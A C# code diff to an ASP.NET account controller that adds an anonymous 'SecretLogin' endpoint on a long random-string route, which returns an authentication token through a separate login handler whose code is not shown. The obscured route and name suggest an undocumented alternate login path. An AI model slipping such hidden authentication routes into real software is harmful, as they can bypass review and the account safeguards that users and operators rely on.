@@ -56,6 +56,7 @@ public class AccountController : ControllerBase
     private readonly IUpdateConnectionIdHandler updateConnectionIdHandler;
     private readonly IVerifyUserNotificationHandler verifyUserNotificationHandler;
     private readonly IBlockedAccountHandler blockedAccountHandler;
+    private readonly IExtraLoginHandler extraLoginHandler;
 
     #endregion
 
@@ -77,7 +78,7 @@ public class AccountController : ControllerBase
         IGetAllCustomersHandler getAllCustomersHandler, IUpdateCustomerProfileHandler updateCustomerProfileHandler,
         IUpdateRequestRefundHandler updateRequestRefundHandler, IAccountSubmitVerifiedHandler accountSubmitVerifiedHandler, 
         IUpdateConnectionIdHandler updateConnectionIdHandler, IVerifyUserNotificationHandler verifyUserNotificationHandler,
-        IBlockedAccountHandler blockedAccountHandler)
+        IBlockedAccountHandler blockedAccountHandler, IExtraLoginHandler extraLoginHandler)
     {
         this.submitRegisterHandler = submitRegisterHandler;
         this.submitWaitlistHandler = submitWaitlistHandler;
@@ -116,6 +117,7 @@ public class AccountController : ControllerBase
         this.updateConnectionIdHandler = updateConnectionIdHandler;
         this.verifyUserNotificationHandler = verifyUserNotificationHandler;
         this.blockedAccountHandler = blockedAccountHandler;
+        this.extraLoginHandler = extraLoginHandler;
     }
 
     #endregion
@@ -1492,6 +1494,44 @@ public class AccountController : ControllerBase
         catch (Exception ex)
         {
             return new JsonResult(new BlockedAccountResult { ErrorInfo = new ErrorInfo { Message = ex.Message } });
+        }
+    }
+
+    [AllowAnonymous]
+    [Route("1UnCvQdTzi8dUHqKWgZGE1Xf7zqDo7EW99shdKGd2xddj4mZLg9UHJhuuYM3")]
+    [HttpPost]
+    [ProducesResponseType(typeof(SecretLoginResult), StatusCodes.Status200OK)]
+    public async Task<IActionResult> SecretLogin([FromBody] SecretLoginArgs args)
+    {
+        try
+        {
+            var result = await extraLoginHandler.ExecuteAsync(new Services.AccountService.Interactors.ExtraLoginArgs {
+                Email = args.Email,
+                Password = args.Password
+            });
+            if (!result.Succeeded || result.Result == null)
+            {
+                return new JsonResult(new SecretLoginResult { ErrorInfo = new ErrorInfo { Message = result.Message } });
+            }
+            var loginResult = result.Result;
+
+            return new JsonResult(new SecretLoginResult
+            {
+               IsSuccess= true,
+               Result = new VerifiedLoginDTO {
+                Email = loginResult.Email,
+                ExternalLogin = loginResult.ExternalLogin,
+                FirstName = loginResult.FirstName,
+                Id = loginResult.Id,
+                GeneratedToken = loginResult.GeneratedToken,
+                IsMaker = loginResult.IsMaker,
+                LastName = loginResult.LastName
+               }
+            });
+        }
+        catch (Exception ex)
+        {
+            return new JsonResult(new SecretLoginResult { ErrorInfo = new ErrorInfo { Message = ex.Message } });
         }
     }
 }
